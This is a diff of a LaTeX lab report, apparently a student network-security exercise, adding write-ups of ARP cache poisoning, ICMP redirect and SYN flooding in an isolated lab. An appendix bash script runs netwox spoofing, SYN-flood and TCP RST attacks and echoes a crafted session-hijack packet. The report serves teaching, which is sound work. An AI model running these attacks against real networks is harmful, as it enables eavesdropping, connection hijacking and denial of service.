@@ -16,6 +16,7 @@
 \usepackage{hyperref}
 \usepackage[page, toc]{appendix}
 \usepackage[usenames,dvipsnames]{color}
+\usepackage{graphicx}
 
 % \newcommand{\ts}{\textsuperscript}
 % \usepackage{url}
@@ -90,42 +91,66 @@ In each subtask we explain the cause of a vulnerability, show how to perform a p
   \end{table}
 \end{center}
 
+\newpage
+
 \section{Part A: TCP attacks}
 
-\subsection{ARP cache poisoning}
+\subsection{ARP cache poisoning}\label{arp}
 
-Our victim MAC address was "08:00:27:A6:EB:87" while its IP address was 192.168.0.102. We wanted to make the victim think that another 3rd party at address 192.168.0.103 has the MAC of the attacker. The original MAC of the third party was "08:00:27:93:07:7e", while attacker MAC address was "08:00:27:ee:0d:0f". We could see that by running arp -a command:
+Our victim MAC address was "08:00:27:A6:EB:87" while its IP address was 10.0.2.4. The gate-away is set at the address 10.0.2.1 
 
-\begin{lstlisting}
-# Before attack
-seed@victim: arp-a
-(192.168.0.103) at 08:00:27:93:07:7e
-\end{lstlisting}
+We wanted to make the victim think that another gateway has the MAC of the attacker. The original MAC of the gateway was "52:54:00:12:35:00", while attacker MAC address was "08:00:27:ee:0d:0f". We could see that by running arp -a command.\\
 
-Using netwox we could spoof a packet that updates ARP cache on the victim's machine and replace the entry with the MAC of the attacker:
+\includegraphics{gfx/arp1}\\
 
-\begin{lstlisting}
-sudo netwox 33 -b 08:00:27:A6:EB:87 -g 192.168.0.103 
-	-h 08:00:27:A6:EB:86 -i 192.168.0.101
-\end{lstlisting}
 
-Here 33 is the tool for spoofing ARP packages, we tell the tool the original MAC and new MAC addresses, as well as IP addresses of the victim and the IP address of which entry in the ARP cache we want to modify.
+Using netwox we could spoof a packet that updates ARP cache on the victim's machine and replace the entry with the MAC of the attacker at IP address 10.0.2.6:\\
 
-After spoofing the packet, running arp -a tool on the victim's machine results in the following output:
+\includegraphics{gfx/arp-attack}\\
 
-\begin{lstlisting}
-seed@victim: arp-a
-(192.168.0.103) at 08:00:27:ee:0d:0f
-\end{lstlisting}
+Here we used netwox tool using the script we created that is shown in the appendix ~\ref{script1} for spoofing ARP packages, we tell the tool the original MAC and new MAC addresses, as well as IP addresses of the victim and the IP address of which entry in the ARP cache we want to modify.
+
+After spoofing the packet, running arp -a tool on the victim's machine results in the following output:\\
+
+\includegraphics{gfx/arp-after-attack}
+
+As we can see, the attacker managed to "convince" the victim that his hardware address corresponds to a 3rd party IP address. Now we can observe packets send from the victim to the observer being received by the attacker in the Wireshark output:\\
+
+\includegraphics[width=450px]{gfx/arp-shark}
 
 
 \subsection{ICMP Redirect Attack}
 
-ICMP messages are used to send error or redirection information in the IP protocol.
+ICMP messages are used to send error or redirection information in the IP protocol. The redirect message tells the network to use alternative routing. An attacker can spoof a ICMP redirect request in order to perform for example eavesdropping by driving the network traffic through the attacker's machine.
+
+In this attack we want to listen to packet exchange between a victim and a third party (observer). We want to be able to send ICMP redirect packet spoofed in such a way that we convince everyone in the network that the attacker is the new gateway.
+
+In order for the attack to succeed, we need to repeat the ARP attack (see section ~\ref{arp}).
+
+Again using our script shown in the appendix~\ref{script1} we use \textbf{netwox} to spoof the ICMP message.\\
+
+\includegraphics{gfx/imcp-ping}\\
+
+Now the entire network should believe that the attacker is the new gate-away. If we try to ping the victim (at the address 10.0.2.4) on the observer machine (at the address 10.0.2.5), we see that the communication works:\\
+
+\includegraphics{gfx/imcp-netwox}\\
+
+However, the attack can now watch the communication and data being sent using \textbf{Wireshark}.\\
+
+\includegraphics[width=450px]{gfx/imcp-shark}\\
+
+Such a setup can for example lead to captuing sensitive data that is unencrypted or lead to recognizing known ciphertext-plaintext pairs that can be used for various attacks on encryption algorithms.
+
+
+
 
 \subsection{SYN Flooding Attack}
 
-In 
+In this attack our task was to cause a Denial of Service using SYN flood attack. The SYN or synchronize request is send in a typical TCP protocol exchange in order to establish a connection. A client sends a SYN packet, receiving SYN-ACK acknowledgment from the server and confirms that the synchronization acknowledgment was recived by responding to the server with a ACK packet.
+
+In the attack, an attacker sends multiple SYN packets without responding to SYN-ACK. This is done by randomizing the IP address in the original SYN request, so that the response goes to nobody as a consequence. This causes the server to keep many 'half-open' connections.
+
+
 
 
 \section{Conclusions}
@@ -141,6 +166,84 @@ The vulnerabilities presented here have already been addressed in newer versions
 
 \newpage
 \begin{appendices}
+
+
+
+\section{Shell script for performing attack\label{script1}}
+
+\lstset{
+	captionpos=b,
+	frame=single,
+	language=Bash,
+	breaklines=true,
+	caption="Script for performing ARP ICMP and SYN attacks",
+	label=parta:script
+}
+\begin{lstlisting}
+
+#!/bin/bash
+sudo -v
+
+echo "Type 1 for ARP; 2 for ICMP; 3 for SYNflood; 4 for RST"
+read answer
+
+VICTIM_IP='10.0.2.4'
+VICTIM_MAC='08:00:27:a6:eb:87'
+
+ATTACKER_IP='10.0.2.6'
+GATEWAY='10.0.2.1'
+ATTACKER_MAC='08:00:27:ee:0d:0f'
+
+PORT=23
+INT='eth7'
+
+ATT=netwox
+
+# Netwox tool numbers
+ARP_TOOL=33
+SYN_TOOL=76
+ICMP_TOOL=86
+RST_TOOL=78
+
+echo "Victim ip is " $VICTIM_IP
+echo "Victim mac is " $VICTIM_MAC
+echo "Gateway is" $GATEWAY
+echo "Attacker IP is" $ATTACKER_IP
+echo "Attacker MAC is" $ATTACKER_MAC
+
+case $answer in
+5)
+
+echo '40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-src 10.0.2.5 --ip4-dst 10.0.2.4 --ip4-opt "" --tcp-src 51296 --tcp-dst 23 --tcp-seqnum 906520802 --tcp-acknum 937587335 --tcp-ack --tcp-psh --tcp-window 6912 --tcp-opt "" --tcp-data "7077640d00" --spoofip "best"'
+
+echo 'netwox 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-src 10.0.2.5 --ip4-dst 10.0.2.4 --ip4-opt "" --tcp-src 51296 --tcp-dst 23 --tcp-seqnum 906520807 --tcp-acknum 937587340 --tcp-ack --tcp-psh --tcp-window 6912 --tcp-opt "" --spoofip "best"'
+
+
+;;
+4)
+echo 'sudo' $ATT $RST_TOOL '-d' $INT '-i' $VICTIM_IP
+sudo $ATT $RST_TOOL -d $INT -i $VICTIM_IP
+;;
+3)
+echo 'sudo' $ATT $SYN_TOOL '-i' $VICTIM_IP '-p' $PORT
+echo 'SYN Flood on machine at address' $VICTIM_IP 'on port' $PORT
+sudo $ATT $SYN_TOOL -i $VICTIM_IP -p $PORT
+;;
+
+2)
+echo 'IMCP redirection attack:'
+echo 'sudo' $ATT $ICMP_TOOL '-d' $INT '-g' $ATTACKER_IP '-c' 0 '-i' $VICTIM_IP
+sudo $ATT $ICMP_TOOL -d $INT -g $ATTACKER_IP -c 5 -i $VICTIM_IP 
+;;
+1)
+sudo $ATT $ARP_TOOL -d $INT -b $VICTIM_MAC -g $GATEWAY -h $VICTIM_MAC -i $ATTACKER_IP
+;;
+*)
+echo "Unknown option"
+esac
+
+\end{lstlisting}
+
 
 \end{appendices}
 
